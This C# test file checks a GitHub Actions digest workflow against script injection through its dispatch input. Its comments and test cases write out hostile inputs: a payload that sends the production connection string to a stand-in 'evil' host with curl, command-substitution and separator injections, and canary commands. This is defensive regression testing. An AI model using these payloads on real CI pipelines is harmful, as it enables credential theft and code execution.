using System.Diagnostics;
using System.Text;
using YamlDotNet.RepresentationModel;

namespace SentenceStudio.Api.Tests.Coach.Opportunities;

/// <summary>
/// The digest workflow reads production with a credential, and its window is chosen by whoever
/// clicks Run workflow. These tests hold those two facts apart.
/// </summary>
/// <remarks>
/// <para>
/// The defect this file was written for: <c>--days "${{ github.event.inputs.days || '7' }}"</c>
/// sat inside the same <c>run:</c> block that carried
/// <c>COACH_DIGEST_CONNECTION_STRING</c>. Actions substitutes expressions into the script TEXT
/// before a shell ever parses it, so the quotes in the workflow file are not shell quotes around
/// the value — they are literal characters the attacker's string gets to close. A dispatch of
/// <c>7"; curl evil/?k=$COACH_DIGEST_CONNECTION_STRING; #</c> would have exfiltrated the
/// production connection string, and nothing in the job would have looked unusual.
/// </para>
/// <para>
/// The fix is that the expression appears only under <c>env:</c>, where the runner hands it to the
/// shell as data. These tests assert that as a structural property of the parsed workflow rather
/// than as a string search, and then actually run the validation script against hostile input to
/// show that it refuses rather than obeys.
/// </para>
/// </remarks>
public class SamOpportunityDigestWorkflowSecurityTests
{
    private const string WorkflowPath = ".github/workflows/sam-opportunity-digest.yml";

    // ------------------------------------------------------------------ reading the workflow

    private static string RepositoryRoot()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);

        while (directory is not null && !Directory.Exists(Path.Combine(directory.FullName, ".github")))
        {
            directory = directory.Parent;
        }

        return directory?.FullName
            ?? throw new InvalidOperationException("Could not find the repository root from the test output directory.");
    }

    private static YamlMappingNode Workflow(string relativePath = WorkflowPath)
    {
        var stream = new YamlStream();
        using var reader = new StreamReader(Path.Combine(RepositoryRoot(), relativePath));
        stream.Load(reader);

        return (YamlMappingNode)stream.Documents.Single().RootNode;
    }

    private static IEnumerable<string> WorkflowFiles() =>
        Directory.EnumerateFiles(Path.Combine(RepositoryRoot(), ".github", "workflows"), "*.y*ml")
            .Select(path => Path.GetRelativePath(RepositoryRoot(), path))
            .OrderBy(path => path, StringComparer.Ordinal);

    /// <summary>Every step of every job, flattened, with the job it came from.</summary>
    private static IEnumerable<(string Job, YamlMappingNode Step)> Steps(YamlMappingNode workflow)
    {
        var jobs = (YamlMappingNode)workflow.Children[new YamlScalarNode("jobs")];

        foreach (var (name, job) in jobs.Children)
        {
            if (job is not YamlMappingNode mapping ||
                !mapping.Children.TryGetValue(new YamlScalarNode("steps"), out var steps))
            {
                continue;
            }

            foreach (var step in ((YamlSequenceNode)steps).Children.OfType<YamlMappingNode>())
            {
                yield return (((YamlScalarNode)name).Value ?? "?", step);
            }
        }
    }

    private static string? Scalar(YamlMappingNode node, string key) =>
        node.Children.TryGetValue(new YamlScalarNode(key), out var value)
            ? ((YamlScalarNode)value).Value
            : null;

    private static IReadOnlyDictionary<string, string> Env(YamlMappingNode step)
    {
        if (!step.Children.TryGetValue(new YamlScalarNode("env"), out var env) ||
            env is not YamlMappingNode mapping)
        {
            return new Dictionary<string, string>();
        }

        return mapping.Children.ToDictionary(
            pair => ((YamlScalarNode)pair.Key).Value ?? string.Empty,
            pair => ((YamlScalarNode)pair.Value).Value ?? string.Empty,
            StringComparer.Ordinal);
    }

    private static string StepName(YamlMappingNode step) => Scalar(step, "name") ?? "(unnamed step)";

    // ================================================================== the file is still a workflow

    /// <summary>
    /// Parsing is the precondition for every other test here — a file that does not load is a
    /// workflow that silently never runs, which would also make every contract below vacuous.
    /// </summary>
    [Fact]
    public void TheWorkflowIsValidYaml()
    {
        var workflow = Workflow();

        Scalar(workflow, "name").Should().Be("Sam Opportunity Digest");
        workflow.Children.Should().ContainKey(new YamlScalarNode("jobs"));
    }

    [Fact]
    public void EveryWorkflowInTheRepositoryIsValidYaml()
    {
        foreach (var file in WorkflowFiles())
        {
            var load = () => Workflow(file);
            load.Should().NotThrow($"{file} has to load before Actions can run it");
        }
    }

    /// <summary>
    /// The schedule is the path nobody watches: it runs with no dispatch input at all, so the
    /// default is what production actually reports on every Monday.
    /// </summary>
    [Fact]
    public void TheScheduledRunStillDefaultsToSevenDays()
    {
        var workflow = Workflow();

        // `on` is the YAML 1.1 boolean `true`, which is why it is read by value rather than by name.
        var triggers = (YamlMappingNode)workflow.Children
            .Single(pair => ((YamlScalarNode)pair.Key).Value is "on" or "True" or "true").Value;

        var days = (YamlMappingNode)((YamlMappingNode)((YamlMappingNode)triggers
            .Children[new YamlScalarNode("workflow_dispatch")])
            .Children[new YamlScalarNode("inputs")])
            .Children[new YamlScalarNode("days")];

        Scalar(days, "default").Should().Be("7");
        Scalar(days, "required").Should().Be("false");

        var schedule = (YamlSequenceNode)triggers.Children[new YamlScalarNode("schedule")];
        schedule.Children.OfType<YamlMappingNode>()
            .Select(entry => Scalar(entry, "cron"))
            .Should().ContainSingle().Which.Should().Be("0 13 * * 1");

        // The fallback the run itself uses when no input was supplied.
        Steps(Workflow())
            .Select(s => Env(s.Step))
            .Where(env => env.ContainsKey("DIGEST_DAYS"))
            .Select(env => env["DIGEST_DAYS"])
            .Should().Contain(value => value.Contains("|| '7'"),
                "a scheduled run supplies no input, so the seven-day window has to come from the expression");
    }

    // ================================================================== the structural contract

    /// <summary>
    /// The whole fix in one assertion: the dispatch input is interpolated into <c>env</c>, and into
    /// nothing else, anywhere in the repository.
    /// </summary>
    [Fact]
    public void NoRunBlockInAnyWorkflowInterpolatesAUserControlledExpression()
    {
        // Everything an outside party can influence on a trigger this repository uses. A value from
        // any of these becomes script if it is interpolated into `run:`.
        string[] userControlled =
        [
            "github.event.inputs.",
            "inputs.",
            "github.event.pull_request.",
            "github.event.issue.",
            "github.event.comment.",
            "github.event.review.",
            "github.head_ref"
        ];

        var offenders = new List<string>();

        foreach (var file in WorkflowFiles())
        {
            foreach (var (job, step) in Steps(Workflow(file)))
            {
                var run = Scalar(step, "run");
                if (run is null)
                {
                    continue;
                }

                foreach (var source in userControlled.Where(run.Contains))
                {
                    offenders.Add($"{file} :: {job} :: {StepName(step)} :: {source}");
                }
            }
        }

        offenders.Should().BeEmpty(
            "an expression in a run block is substituted into the script text before bash parses it, "
            + "so a user-supplied value there is code rather than an argument");
    }

    /// <summary>
    /// The stronger rule, scoped to where it matters most: a step holding a secret runs a script
    /// with no substitution in it at all, so there is nothing for an expression to smuggle.
    /// </summary>
    [Fact]
    public void NoRunBlockThatHoldsASecretContainsAnyExpressionAtAll()
    {
        var offenders = new List<string>();

        foreach (var file in WorkflowFiles())
        {
            foreach (var (job, step) in Steps(Workflow(file)))
            {
                var run = Scalar(step, "run");
                var holdsSecret = Env(step).Values.Any(value => value.Contains("secrets."));

                if (run is not null && holdsSecret && run.Contains("${{"))
                {
                    offenders.Add($"{file} :: {job} :: {StepName(step)}");
                }
            }
        }

        offenders.Should().BeEmpty(
            "a script that is assembled by string substitution cannot be read to be safe; "
            + "values reach these steps through env, where the runner passes them as data");
    }

    /// <summary>
    /// The step that first touches dispatch text holds no credential, so the blast radius of a
    /// mistake in the validation itself is a failed job rather than a disclosed database.
    /// </summary>
    [Fact]
    public void TheStepThatReadsTheDispatchInputHoldsNoSecret()
    {
        var validating = Steps(Workflow())
            .Where(s => Env(s.Step).Values.Any(v => v.Contains("github.event.inputs.")))
            .ToList();

        validating.Should().ContainSingle("only one step should ever see the raw input");

        Env(validating[0].Step).Values.Should().NotContain(value => value.Contains("secrets."),
            "the shell that first sees learner-dispatched text should have nothing worth stealing");
    }

    /// <summary>
    /// Order matters: a window that is validated after the read has already happened is not a
    /// control, it is a comment.
    /// </summary>
    [Fact]
    public void TheWindowIsValidatedBeforeTheDatabaseIsRead()
    {
        var steps = Steps(Workflow()).Select(s => s.Step).ToList();

        var validates = steps.FindIndex(step =>
            Env(step).Values.Any(value => value.Contains("github.event.inputs.")));
        // Matched on the variable the credential is bound to, not on any mention of `secrets.` —
        // the prerequisite step compares the secret to '' and receives only a boolean.
        var reads = steps.FindIndex(step => Env(step).ContainsKey("COACH_DIGEST_CONNECTION_STRING"));

        validates.Should().BeGreaterThanOrEqualTo(0);
        reads.Should().BeGreaterThan(validates,
            "the database is read only after the window has been proved to be digits");
    }

    /// <summary>
    /// Quoting is the belt to validation's braces. It is what keeps the guarantee from depending on
    /// the validation staying correct through the next edit.
    /// </summary>
    [Fact]
    public void TheDigestIsInvokedWithTheWindowQuoted()
    {
        var read = Steps(Workflow())
            .Single(s => Env(s.Step).ContainsKey("COACH_DIGEST_CONNECTION_STRING"))
            .Step;

        var run = Scalar(read, "run")!;

        run.Should().Contain("--days \"$DIGEST_DAYS\"",
            "an unquoted variable is re-split and glob-expanded by the shell");
        run.Should().NotContain("--days $DIGEST_DAYS ");
        run.Should().NotContain("github.event.inputs");
    }

    // ================================================================== running the guard for real

    /// <summary>The validation script exactly as the workflow ships it.</summary>
    private static string ValidationScript() =>
        Scalar(
            Steps(Workflow())
                .Single(s => Env(s.Step).Values.Any(v => v.Contains("github.event.inputs.")))
                .Step,
            "run")!;

    private sealed record GuardResult(int ExitCode, string Stdout, string Stderr, string Output, IReadOnlyList<string> Residue);

    /// <summary>
    /// Runs the shipped validation script with <c>DIGEST_DAYS</c> set to <paramref name="days"/>,
    /// in a scratch directory, and reports what it did — including anything the script left behind
    /// beyond the two files it was given.
    /// </summary>
    /// <remarks>
    /// The scratch directory is the child process's working directory, so a payload such as
    /// <c>touch pwned</c> lands there and shows up in <c>Residue</c>. The process-wide current
    /// directory is deliberately never changed: these tests run in parallel with host-boot tests
    /// that resolve their content root relative to it.
    /// </remarks>
    private static GuardResult RunGuard(string days)
    {
        var scratch = Path.Combine(AppContext.BaseDirectory, "workflow-guard-" + Guid.NewGuid().ToString("n"));
        Directory.CreateDirectory(scratch);

        try
        {
            var scriptPath = Path.Combine(scratch, "validate.sh");
            var outputPath = Path.Combine(scratch, "github_output");
            File.WriteAllText(scriptPath, ValidationScript());
            File.WriteAllText(outputPath, string.Empty);

            var start = new ProcessStartInfo("/bin/bash", $"\"{scriptPath}\"")
            {
                WorkingDirectory = scratch,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };
            start.Environment["DIGEST_DAYS"] = days;
            start.Environment["GITHUB_OUTPUT"] = outputPath;

            using var process = Process.Start(start)!;
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit(TimeSpan.FromSeconds(30));

            var residue = Directory.EnumerateFileSystemEntries(scratch)
                .Select(Path.GetFileName)
                .Where(name => name is not ("validate.sh" or "github_output"))
                .Select(name => name!)
                .OrderBy(name => name, StringComparer.Ordinal)
                .ToList();

            return new GuardResult(process.ExitCode, stdout, stderr, File.ReadAllText(outputPath), residue);
        }
        finally
        {
            Directory.Delete(scratch, recursive: true);
        }
    }

    /// <summary>
    /// The values a reviewer actually types, including the documented "everything still retained".
    /// </summary>
    [Theory]
    [InlineData("7")]
    [InlineData("0")]
    [InlineData("1")]
    [InlineData("30")]
    [InlineData("365")]
    [InlineData("3650")]
    public void AWholeNumberOfDaysIsAccepted(string days)
    {
        var result = RunGuard(days);

        result.ExitCode.Should().Be(0, "'{0}' is a window a reviewer would ask for", days);
        result.Output.Trim().Should().Be($"days={days}");
        result.Residue.Should().BeEmpty("a valid window does nothing but write its output");
    }

    /// <summary>
    /// A negative control for the test above. It runs the workflow as it was BEFORE the fix, with
    /// the input spliced into the script text the way Actions would have substituted it, and shows
    /// the canary fires.
    /// </summary>
    /// <remarks>
    /// Without this, <see cref="AWindowThatIsNotDigitsIsRefusedAndNeverExecuted"/> would still pass
    /// if the harness were simply incapable of noticing an executed payload, and the suite would be
    /// reassuring rather than informative.
    /// </remarks>
    [Fact]
    public void TheCanaryWouldHaveCaughtTheOriginalDefect()
    {
        var scratch = Path.Combine(AppContext.BaseDirectory, "workflow-control-" + Guid.NewGuid().ToString("n"));
        Directory.CreateDirectory(scratch);

        try
        {
            // The shape of the old step: the dispatch value substituted into the script text, in a
            // step that also held the connection string.
            const string payload = "7\"; touch pwned; echo \"";
            var scriptPath = Path.Combine(scratch, "vulnerable.sh");
            File.WriteAllText(scriptPath, $"dotnet run --days \"{payload}\"\n");

            var start = new ProcessStartInfo("/bin/bash", $"\"{scriptPath}\"")
            {
                WorkingDirectory = scratch,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };

            using var process = Process.Start(start)!;
            process.StandardOutput.ReadToEnd();
            process.StandardError.ReadToEnd();
            process.WaitForExit(TimeSpan.FromSeconds(30));

            Directory.EnumerateFileSystemEntries(scratch)
                .Select(Path.GetFileName)
                .Should().Contain("pwned",
                    "this is what the workflow did before the fix, and what the canary is watching for");
        }
        finally
        {
            Directory.Delete(scratch, recursive: true);
        }
    }

    /// <summary>
    /// The injection cases. Each of these would have been executed by the old workflow, in the step
    /// holding the production connection string.
    /// </summary>
    /// <remarks>
    /// These assert two separate things. The exit code proves the guard refuses. The absence of the
    /// canary file proves the payload was never executed even while being refused — that the value
    /// stayed data all the way through, rather than running and then being rejected afterwards.
    /// </remarks>
    [Theory]
    // The original exfiltration: close the quote, run a command, comment out the rest.
    [InlineData("7\"; curl -d \"$COACH_DIGEST_CONNECTION_STRING\" https://evil.example; echo \"")]
    [InlineData("7\"; touch pwned; echo \"")]
    // Substitution that does not need to escape a quote.
    [InlineData("$(touch pwned)")]
    [InlineData("`touch pwned`")]
    [InlineData("${COACH_DIGEST_CONNECTION_STRING}")]
    // Separators.
    [InlineData("7; touch pwned")]
    [InlineData("7 && touch pwned")]
    [InlineData("7 | touch pwned")]
    [InlineData("7\ntouch pwned")]
    // Extra arguments to the tool rather than to the shell.
    [InlineData("7 --output /etc/passwd")]
    [InlineData("--connection")]
    // Word splitting and globbing, which is what the quoting defends against.
    [InlineData("7 7")]
    [InlineData("*")]
    // Shapes that are numeric-ish but not digits.
    [InlineData("-1")]
    [InlineData("+7")]
    [InlineData("7.5")]
    [InlineData("0x7")]
    [InlineData(" 7")]
    [InlineData("7 ")]
    [InlineData("")]
    // Above the ceiling.
    [InlineData("3651")]
    [InlineData("99999999")]
    public void AWindowThatIsNotDigitsIsRefusedAndNeverExecuted(string days)
    {
        var result = RunGuard(days);

        result.ExitCode.Should().NotBe(0, "'{0}' is not a window", days);
        result.Output.Should().BeEmpty("a refused window must not reach the database step");

        result.Residue.Should().BeEmpty(
            "the payload has to stay data — being rejected after running would still be a breach");
    }

    /// <summary>
    /// Refusing loudly is good; refusing loudly while echoing the attacker's string back into a log
    /// the runner parses for <c>::</c> commands is a second injection surface.
    /// </summary>
    [Fact]
    public void TheGuardDoesNotEchoTheRejectedValueBackIntoTheLog()
    {
        const string marker = "9999999999999999";

        var result = RunGuard($"{marker}x");

        (result.Stdout + result.Stderr).Should().NotContain(marker,
            "a job's own output is read back for workflow commands, so untrusted text must not be printed");
    }

    // ---------------------------------------------------------------- past int64

    /// <summary>
    /// A digit string longer than int64 is still digits, so the character-class guard passes it
    /// through to <c>[ -gt ]</c> — which compares as a machine integer. What a shell does with an
    /// operand it cannot represent is not something a ceiling should depend on: some saturate, some
    /// wrap, some error. A window that wrapped to a small positive number would be a value the
    /// policy refuses arriving at the tool as one it allows.
    /// </summary>
    /// <remarks>
    /// The length check in front of the comparison is what closes this. 3650 is four digits, so the
    /// whole of the allowed range fits in four and anything longer is refused before arithmetic is
    /// attempted. These are the cases that motivated it.
    /// </remarks>
    [Theory]
    // 23 nines — well past int64, which tops out at 19 digits.
    [InlineData("99999999999999999999999")]
    // 40 nines, in case a shell only misbehaves further out.
    [InlineData("9999999999999999999999999999999999999999")]
    // int64 max, and one past it.
    [InlineData("9223372036854775807")]
    [InlineData("9223372036854775808")]
    // uint64 max, and one past it.
    [InlineData("18446744073709551615")]
    [InlineData("18446744073709551616")]
    // A wrap that would land back inside the allowed range if the comparison were reached:
    // 2^64 + 7, which is 7 modulo 2^64.
    [InlineData("18446744073709551623")]
    // Leading zeros pad a legal window past the length limit. Refused rather than trimmed: the
    // guard's job is to be predictable, not to guess what was meant.
    [InlineData("00007")]
    [InlineData("000000000000000000000007")]
    // The first digit string longer than the allowed range.
    [InlineData("36500")]
    public void ADigitStringTooLongToCompareIsRefusedBeforeArithmetic(string days)
    {
        var result = RunGuard(days);

        result.ExitCode.Should().NotBe(0, "'{0}' is outside the window policy", days);

        result.Output.Should().BeEmpty(
            "a window the shell cannot compare must not be published to the step that holds the secret");

        result.Residue.Should().BeEmpty("nothing about this input is executable");

        (result.Stdout + result.Stderr).Should().NotContain(days,
            "the rejection must not print the value back into a log the runner reparses");
    }

    /// <summary>
    /// The length check has to sit in front of the numeric one, or it is not protecting it. Read off
    /// the shipped script rather than inferred from behaviour, because a future edit that reorders
    /// them would still pass every input test on a shell that happens to saturate.
    /// </summary>
    [Fact]
    public void TheLengthCheckPrecedesTheNumericCeiling()
    {
        var script = ValidationScript();

        var length = script.IndexOf("${#DIGEST_DAYS}", StringComparison.Ordinal);
        var ceiling = script.IndexOf("-gt 3650", StringComparison.Ordinal);

        length.Should().BeGreaterThan(-1, "the guard bounds the length of the value it is about to compare");
        ceiling.Should().BeGreaterThan(-1, "the ceiling is still enforced");

        length.Should().BeLessThan(ceiling,
            "checking the length after the comparison leaves the comparison unprotected");
    }

    /// <summary>
    /// Closing the overflow gap must not have narrowed the window the workflow documents. The whole
    /// legal range still fits.
    /// </summary>
    [Theory]
    [InlineData("0")]
    [InlineData("7")]
    [InlineData("365")]
    [InlineData("3650")]
    public void TheLengthCheckStillAdmitsTheWholeAllowedRange(string days)
    {
        var result = RunGuard(days);

        result.ExitCode.Should().Be(0, "'{0}' is inside the documented range", days);
        result.Output.Trim().Should().Be($"days={days}");
    }

    /// <summary>
    /// The script has to fail on the first bad thing rather than carry on to the write.
    /// </summary>
    [Fact]
    public void TheGuardRunsUnderStrictShellSettings()
    {
        var script = ValidationScript();

        script.Should().Contain("set -euo pipefail");
        script.Should().Contain("\"$DIGEST_DAYS\"",
            "even inside the guard the value is only ever referenced quoted");
    }

    /// <summary>
    /// A guard nobody can see is a guard nobody maintains: the value that reaches the tool is the
    /// one the guard published, not the raw input.
    /// </summary>
    [Fact]
    public void TheDatabaseStepReadsTheValidatedWindowRatherThanTheRawInput()
    {
        var read = Steps(Workflow())
            .Single(s => Env(s.Step).ContainsKey("COACH_DIGEST_CONNECTION_STRING"))
            .Step;

        Env(read)["DIGEST_DAYS"].Should().Contain("steps.")
            .And.Contain("outputs.")
            .And.NotContain("github.event.inputs",
                "the raw input never reaches the step that holds the credential");
    }

    /// <summary>
    /// The credential is referenced and never rendered. Kept here alongside the injection tests
    /// because exfiltration and disclosure are the same failure with different verbs.
    /// </summary>
    [Fact]
    public void TheConnectionStringIsNeverEchoedOrPassedAsAnArgument()
    {
        var text = new StringBuilder();

        foreach (var (_, step) in Steps(Workflow()))
        {
            text.AppendLine(Scalar(step, "run") ?? string.Empty);
        }

        var scripts = text.ToString();

        scripts.Should().NotContain("echo \"$COACH_DIGEST_CONNECTION_STRING\"");
        scripts.Should().NotContain("echo $COACH_DIGEST_CONNECTION_STRING");
        scripts.Should().NotContain("--connection",
            "the tool reads the credential from the environment, where it is not in a process list");
    }
}
